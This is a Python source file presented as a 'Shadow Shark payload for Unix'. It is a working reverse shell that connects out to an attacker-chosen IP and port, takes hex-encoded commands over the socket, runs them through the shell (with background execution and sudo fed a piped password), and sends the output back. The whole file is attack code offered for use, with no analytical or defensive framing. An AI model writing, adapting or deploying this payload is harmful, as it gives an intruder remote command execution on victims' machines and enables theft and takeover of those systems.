# -*- coding: utf-8 -*-
"""
A full fledged Shadow Shark payload for Unix.

@author: Mr. Shark Spam Bot
"""

import socket
import subprocess
import os
import codecs
import json
import platform
import getpass
import re

BLUE = '\033[94m'
GREEN = '\033[92m'
NORMAL = '\033[0m'

sudo_regex = re.compile(r'echo .* \| sudo (\-\-stdin|\-S) .*')

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        new_text = text.encode()
        new_text = codecs.encode(new_text, encoding='hex')
        new_text = new_text.decode()
        new_text = json.dumps(new_text)
        new_text = new_text.encode()
    if decode is True:
        new_text = json.loads(text)
        new_text = new_text.encode()
        new_text = codecs.decode(new_text, encoding='hex')
        new_text = new_text.decode()
    return new_text

rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rev_socket.connect(('IP', PORT)) # Set IP and port on this line.

while True:
    command = b''
    while True:
        try:
            command = command + rev_socket.recv(1024)
            if not command:
                break
            if command[-1] == 34:
                break
        except ValueError:
            continue
    try:
        command = hex_handler(command, decode=True)
    except json.decoder.JSONDecodeError:
        continue

    if command == 'exit':
        rev_socket.close()
        break

    if command == 'directory':
        user = getpass.getuser()
        system = platform.uname().node
        cwd = os.getcwd()
        if cwd.startswith(os.path.expanduser('~')):
            user_path = cwd.split(os.path.expanduser('~'))
            user_path = ''.join(user_path)
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
        else:
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
        rev_socket.send(hex_handler(prompt, encode=True))
        continue

    if command.startswith('background_exec'):
        if len(command.split()) >= 2:
            background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            rev_socket.send(hex_handler('\n', encode=True))
            continue
        else:
            rev_socket.send(hex_handler('Use background_exec in the format background_exec COMMAND.', encode=True))
            continue

    if 'sudo' in command and not sudo_regex.search(command):
        rev_socket.send(hex_handler('Use sudo in the format echo PASSWORD | sudo -S COMMAND.', encode=True))
        continue
    if 'su' in command.split():
        rev_socket.send(hex_handler('su is not supported.', encode=True))
        continue

    output_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout = output_process.stdout.read().decode()
    except UnicodeDecodeError:
        stdout = output_process.stdout.read().decode('utf-16')
    if stdout:
        rev_socket.send(hex_handler(stdout, encode=True))
        continue
    stderr = output_process.stderr.read().decode()
    if stderr:
        rev_socket.send(hex_handler(stderr, encode=True))
        continue

    if command.startswith('cd') and len(command.split()) >= 2:
        try:
            if command[3] == '~':
                os.chdir(f'{os.path.expanduser("~")}{command[4:]}')
            else:
                os.chdir(command[3:])
        except IOError:
            rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
            continue

    rev_socket.send(hex_handler('\n', encode=True))
